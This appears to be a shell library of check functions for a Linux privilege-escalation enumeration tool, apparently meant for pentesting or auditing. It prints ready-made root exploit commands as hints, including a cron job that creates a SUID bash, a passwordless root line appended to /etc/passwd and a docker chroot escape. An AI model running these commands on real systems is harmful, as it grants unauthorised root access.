#!/bin/sh
# Funciones de chequeo. source-eado por linprivhints.sh
# Convención: cada check_* imprime líneas con formato:
#   SEV|TITULO|DETALLE|COMANDO

GTFO_DB="${LPH_LIBDIR:-./lib}/gtfobins.db"

gtfo_lookup() {
    bin="$1"
    [ -f "$GTFO_DB" ] || return 1
    grep -i "^${bin}|" "$GTFO_DB" 2>/dev/null | head -1
}

check_suid() {
    find / -xdev -perm -4000 -type f 2>/dev/null | while IFS= read -r f; do
        name=$(basename "$f")
        hit=$(gtfo_lookup "$name")
        if [ -n "$hit" ]; then
            cmd=$(echo "$hit" | cut -d'|' -f3)
            echo "CRITICAL|SUID explotable: $f|Binario SUID con técnica conocida en GTFOBins|$cmd"
        else
            echo "INFO|SUID no catalogado: $f|Revisa manualmente si permite escapar a shell|gtfobins.github.io/?#$name"
        fi
    done
}

check_sgid() {
    find / -xdev -perm -2000 -type f 2>/dev/null | while IFS= read -r f; do
        echo "LOW|SGID: $f|Puede ceder privilegios del grupo propietario|ls -l $f"
    done
}

check_sudo() {
    out=$(sudo -ln 2>/dev/null)
    [ -z "$out" ] && return 0
    echo "$out" | grep -i NOPASSWD | while IFS= read -r line; do
        bin=$(echo "$line" | grep -oE '/[^ ]+$')
        name=$(basename "$bin" 2>/dev/null)
        hit=$(gtfo_lookup "$name")
        if [ -n "$hit" ]; then
            cmd=$(echo "$hit" | cut -d'|' -f3)
            echo "CRITICAL|sudo NOPASSWD explotable: $bin|GTFOBins tiene técnica sudo para este binario|sudo $cmd"
        else
            echo "HIGH|sudo NOPASSWD: $bin|Puedes ejecutarlo como root sin contraseña; revisa su función|sudo -l"
        fi
    done
    if echo "$out" | grep -qE 'ALL\s*[:=]\s*\(ALL(:ALL)?\)\s*ALL'; then
        echo "CRITICAL|sudo ALL permitido|El usuario puede ejecutar cualquier comando como root|sudo su -"
    fi
}

check_capabilities() {
    command -v getcap >/dev/null 2>&1 || return 0
    getcap -r / 2>/dev/null | while IFS= read -r line; do
        echo "$line" | grep -qE 'cap_setuid|cap_dac_override|cap_sys_admin|cap_sys_ptrace' && \
            echo "HIGH|Capability peligrosa: $line|Capability que suele permitir escalar a root|https://gtfobins.github.io/#+capabilities"
    done
}

check_cron() {
    for f in /etc/crontab /etc/cron.d/* ; do
        [ -f "$f" ] || continue
        [ -w "$f" ] && echo "CRITICAL|Cron escribible: $f|Puedes editar una tarea que probablemente corre como root|echo '* * * * * root /bin/bash -c \"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\"' >> $f"
    done
    if [ -d /etc/cron.d ] || [ -f /etc/crontab ]; then
        grep -hvE '^\s*#|^\s*$' /etc/crontab /etc/cron.d/* 2>/dev/null | while IFS= read -r line; do
            script=$(echo "$line" | grep -oE '/[^ ]+\.sh' | head -1)
            [ -n "$script" ] && [ -w "$script" ] && \
                echo "CRITICAL|Script de cron escribible: $script|Un cron (probablemente root) ejecuta este script y puedes modificarlo|echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> $script"
        done
    fi
}

check_writable_passwd() {
    [ -w /etc/passwd ] && echo "CRITICAL|/etc/passwd escribible|Puedes añadir un usuario root sin contraseña|echo 'pwn::0:0::/root:/bin/bash' >> /etc/passwd"
    [ -w /etc/shadow ] && echo "CRITICAL|/etc/shadow escribible|Puedes cambiar el hash de la contraseña de root|openssl passwd -1 nuevapass  (pega el hash en /etc/shadow)"
}

check_docker_group() {
    id -nG 2>/dev/null | tr ' ' '\n' | grep -qx docker && \
        echo "CRITICAL|Usuario en grupo docker|Permite montar / dentro de un contenedor y escapar como root|docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
}

check_nfs_no_root_squash() {
    [ -f /etc/exports ] && grep -q 'no_root_squash' /etc/exports 2>/dev/null && \
        echo "HIGH|NFS con no_root_squash|Un export NFS permite escribir como root desde otra máquina|cat /etc/exports"
}

check_history_creds() {
    for f in "$HOME/.bash_history" /root/.bash_history; do
        [ -r "$f" ] 2>/dev/null && grep -qiE 'passw|secret|token' "$f" 2>/dev/null && \
            echo "MEDIUM|Posibles credenciales en $f|Historial de shell con palabras clave sensibles|grep -iE 'passw|secret|token' $f"
    done
}

check_kernel_version() {
    kv=$(uname -r 2>/dev/null)
    echo "INFO|Kernel: $kv|Busca CVEs conocidos para esta versión (no se descarga nada automáticamente)|searchsploit linux kernel $kv"
}
